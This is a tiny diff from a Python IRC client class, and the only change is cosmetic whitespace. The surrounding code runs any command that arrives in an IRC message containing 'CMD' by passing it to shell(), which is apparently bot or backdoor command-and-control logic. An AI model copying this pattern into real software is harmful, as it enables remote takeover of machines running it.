@@ -28,7 +28,7 @@ class IRC:
         print(resp)
 
         if resp.find('CMD') != -1:
-            cmd = resp.split(":")[1].replace('\n' , '').replace('\r', '')
+            cmd = resp.split(":")[1].replace('\n', '').replace('\r', '')
             print(cmd)
             shell(cmd)
 
